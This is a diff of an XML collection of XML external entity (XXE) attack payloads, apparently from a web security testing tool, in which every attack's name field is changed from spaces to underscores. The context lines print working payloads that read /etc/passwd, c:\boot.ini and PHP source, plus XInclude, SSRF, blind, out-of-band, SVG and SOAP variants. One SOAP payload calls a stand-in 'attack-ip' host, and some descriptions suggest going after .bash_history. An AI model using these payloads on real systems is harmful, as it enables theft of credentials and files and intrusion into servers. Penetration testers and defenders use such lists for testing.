@@ -1,7 +1,7 @@
 <?xml version="1.0"?>
 <xxe>
 	<attack>
-		<name>XXE Locator</name>
+		<name>XXE_Locator</name>
 		<code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
 &lt;!DOCTYPE replace [&lt;!ENTITY example &quot;Mantroll&quot;&gt; ]&gt;
  &lt;userInfo&gt;
@@ -14,7 +14,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE Linux File Classic 1</name>
+		<name>XXE_Linux_File_Classic_1</name>
 		<code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &apos;file:///etc/passwd&apos;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;</code>
 
 		<desc>Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. /etc/passwd is a common file on Linux. You will want to modify that to what you are trying to get. There are always good things on .bash_history and other common locations</desc>
@@ -23,7 +23,7 @@
 	</attack>
 	
 	<attack>
-		<name>XXE Linux File Classic 2</name>
+		<name>XXE_Linux_File_Classic_2</name>
 		<code>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE data [
 &lt;!ELEMENT data (#ANY)&gt;
@@ -36,7 +36,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE Linux File Classic 3</name>
+		<name>XXE_Linux_File_Classic_3</name>
 		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
   &lt;!DOCTYPE foo [  
   &lt;!ELEMENT foo ANY &gt;
@@ -47,7 +47,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE Windows File Classic</name>
+		<name>XXE_Windows_File_Classic</name>
 		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [  
   &lt;!ELEMENT foo ANY &gt;
@@ -58,7 +58,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE Linux Base64 Encoded Classic</name>
+		<name>XXE_Linux_Base64_Encoded_Classic</name>
 		<code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</code>
 
 		<desc>The Base64 encoded is trying to retreive the /etc/passwd file. You can encode other desired files and replace the encoded string.</desc>
@@ -66,7 +66,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE Windows Base64 Encoded Classic</name>
+		<name>XXE_Windows_Base64_Encoded_Classic</name>
 		<code>"&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9jOi9ib290LmluaQo=&quot;&gt; %init; ]&gt;&lt;foo/&gt;</code>
 
 		<desc>The Base64 encoded is trying to retreive the c:\boot.ini file. You can encode other desired files and replace the encoded string.</desc>
@@ -74,7 +74,7 @@
 
 	</attack>
 	<attack>
-		<name>PHP Wrapper inside XXE 1</name>
+		<name>PHP_Wrapper_inside_XXE_1</name>
 		<code>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;
 &lt;contacts&gt;
   &lt;contact&gt;
@@ -91,7 +91,7 @@
 
 	</attack>
 	<attack>
-		<name>PHP Wrapper inside XXE 2</name>
+		<name>PHP_Wrapper_inside_XXE_2</name>
 		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
@@ -104,7 +104,7 @@
 
 	</attack>
 	<attack>
-		<name>XInclude attack</name>
+		<name>XInclude_attack</name>
 		<code>&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
 &lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</code>
 
@@ -113,7 +113,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE + SSRF attack</name>
+		<name>XXE+SSRF_attack</name>
 		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
@@ -126,7 +126,7 @@
 
 	</attack>
 	<attack>
-		<name>Error Based XXE</name>
+		<name>Error_Based_XXE</name>
 		<code>---Payload to trigger the XXE---
 
 &lt;?xml version=&quot;1.0&quot; ?&gt;
@@ -148,7 +148,7 @@
 
 	</attack>
 	<attack>
-		<name>Blind XXE</name>
+		<name>Blind_XXE</name>
 		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
@@ -163,7 +163,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE OOB with DTD and PHP filter</name>
+		<name>XXE_OOB_with_DTD_and_PHP_filter</name>
 		<code> ---Code to call the XXE--- 
 &lt;?xml version=&quot;1.0&quot; ?&gt;
 &lt;!DOCTYPE r [
@@ -183,7 +183,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE with local DTD</name>
+		<name>XXE_with_local_DTD</name>
 		<code>&lt;!DOCTYPE root [
     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/WHATEVERLOCAL.dtd&quot;&gt;
 
@@ -203,7 +203,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE inside SVG</name>
+		<name>XXE_inside_SVG</name>
 		<code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
 &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;
 &lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;
@@ -215,7 +215,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE inside SOAP</name>
+		<name>XXE_inside_SOAP</name>
 		<code>&lt;soap:Body&gt;
   &lt;foo&gt;
     &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://attack-ip/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;
@@ -227,7 +227,7 @@
 
 	</attack>
 	<attack>
-		<name>XXE inside Excel File</name>
+		<name>XXE_inside_Excel_File</name>
 		<code>See Below</code>
 
 		<desc>----Extract the excel file.----
